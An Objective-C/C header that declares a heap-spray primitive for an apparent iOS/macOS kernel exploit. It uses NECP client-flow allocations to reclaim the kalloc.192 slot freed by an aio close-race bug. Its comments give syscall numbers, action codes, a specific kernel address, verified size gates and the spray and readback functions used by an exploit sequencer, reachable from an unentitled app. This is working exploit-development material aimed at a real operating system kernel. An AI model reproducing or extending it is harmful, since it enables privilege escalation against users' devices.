//
//  P179NecpFlowSpray.h — the NECP client-flow spray primitive (kalloc.192).
//
//  Findings 2026-11-21_necp_client_flow_reclaim_path.md (23F77, every offset
//  kernel-verified): necp_client_flow (kt 0xb0) shares the 192-class kalloc
//  bucket with aio_workq_entry (0xb8) — the reclaim vehicle for the aio
//  close-race free. The path (all windows receipt-corrected — the original
//  findings §4/§5 had both size gates INVERTED; see
//  findings/2026-11-22_necp_addflow_alloc_recipe.md):
//     necp_open(463, flags=0)                            -> the necp fd
//     necp_client_action(464, ADD=1, params in [1,0x800])   (client mode,
//     necp_client_action(464, ADD_FLOW=0x11, req in [0x23,0xf0])  plain app,
//                                                          no entitlement)
//     flags=0x0000 + count=0 = the GUARANTEED path: ret 0, one PERSISTENT
//     flow per call (the unconditional kalloc_type at 0xfffffff00a0b6394).
//  PANIC-FREE: plain syscalls creating legitimate kernel objects (freed at
//  fd close). The shape matrix on the first tap is the layout receipt.
//

#import <Foundation/Foundation.h>
#import <stdint.h>
#import <stddef.h>

#define NECP179_FLOW_REQ_SIZE 0x24u   /* the fixed header — the accept window is
                                        * [0x23, 0xf0] (the sub-cmn-bs decode +
                                        * findings 2026-11-22_necp_addflow_alloc_
                                        * recipe.md; the original >=0xf1 claim had
                                        * the b.ls carry polarity INVERTED — 0xf1
                                        * rejects EINVAL). 0x24 = 16B uuid/result
                                        * + 16B sockaddr + u16 flags + u16 count. */
#define NECP179_ADD_PARAMS_SIZE 0x800u /* the ADD accept window [1, 0x800] — the
                                        * 22:12 receipt: 0x900 -> EINVAL at the gate
                                        * (the >=0x801 direction in findings §4 was
                                        * backwards; the unsigned-compare trap). */

@interface P179NecpFlowSpray : NSObject
+ (NSString *)tap NS_SWIFT_NAME(tap());
@end

/* The C ABI (shared with the T8 sequencer — plain functions, no ObjC state).
   The syscall ABI (findings §4):
     necp_client_action(a0=fd, a1=(client_id<<32)|action, a2=cid_ptr,
                        a3=0x10, a4=buffer, a5=size)                                  */

/* necp_open(463) — client mode. pid 0 first (self), getpid() fallback. */
int necp179_open_fd(void);

/* ADD (action 1): a zeroed parameters blob in [1, 0x800]. The kernel generates
   the 16-byte client uuid and copies it OUT to cid_out. Returns 0 on success. */
int necp179_add_client(int fd, uint8_t cid_out[16]);

/* Fill the 0x24-byte fixed-header request: the sockaddr at +0x10 (16B,
   unique per call), flags at +0x20 (0x0000 = the guaranteed persistent-flow
   path — the alloc at 0xfffffff00a0b6394 fires unconditionally once the
   client lookup passes), count 0 at +0x22. The accept window is [0x23,0xf0];
   sizes beyond 0xf0 reject EINVAL. */
void necp179_req_fill(uint8_t *req, const uint8_t sa[16], uint16_t flags);

/* Build a 16-byte sockaddr_in into sa: sin_len=16, AF_INET, the dotted quad
   a.b.c.d, port (host order). The uniqueness source for the spray. */
void necp179_sa_fill(uint8_t sa[16], uint8_t a, uint8_t b, uint8_t c, uint8_t d,
                     uint16_t port);

/* ADD_FLOW (action 0x11) with a caller-built request (T8's pre-staged
   battery path — no per-call build cost on the spray thread). */
int necp179_add_flow_req(int fd, const uint8_t cid[16], const uint8_t *req,
                         size_t reqlen);

/* ADD_FLOW (action 0x11) with an inline-built request (the shape matrix). */
int necp179_add_flow(int fd, const uint8_t cid[16], const uint8_t sa[16],
                     uint16_t flags);

/* COPY_RESULT (action 3): the client's result/flow-state dump. The buffer
   must be >= 5 bytes (the kernel's flow-divert TLV gate); a larger buffer
   gets the full result build. Returns the syscall rc; the dumped bytes land
   in buf. T8's readback channel — diff across clients after the put. */
int necp179_copy_result(int fd, const uint8_t cid[16], uint8_t *buf, size_t len);
